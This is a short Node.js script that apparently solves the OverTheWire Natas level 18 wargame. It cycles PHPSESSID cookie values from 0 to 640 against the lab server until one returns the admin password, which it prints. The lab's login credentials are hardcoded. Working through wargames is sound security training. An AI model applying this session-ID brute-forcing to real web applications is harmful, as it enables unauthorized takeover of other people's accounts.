const http = require('http');
const querystring = require('querystring');
const slow = require('slow');

const toMillis = ([s, ns]) => s * 1000 + Math.floor(ns / 1000000);

const submit = session =>
  new Promise((resolve, reject) => {
    const request = http.request(
      {
        auth: 'natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          Cookie: `PHPSESSID=${session}`,
        },
        hostname: 'natas18.natas.labs.overthewire.org',
        method: 'POST',
        path: '/index.php?debug=1',
        port: 80,
      },
      res => {
        let body = '';
        res.on('data', data => (body = body + data));
        res.on('end', () => {
          const isAdminSession = !!body.match(/Password/);

          if (isAdminSession) {
            console.log(`Admin Session: ${session}`);

            const regex = /\n(Password: [a-zA-Z0-9]{32})<\/pre>/;
            const password = body.match(regex)[1];

            console.log(password);
          }

          resolve(!!body.match(/Password/));
        });
      },
    );

    const username = 'admin';
    const password = 'password;';

    request.on('error', e => console.log(e));
    request.write(querystring.stringify({username, password}));
    request.end();
  });

const sessions = [...new Array(641)].map((_, i) => i);

slow.run(sessions, i => submit(i));
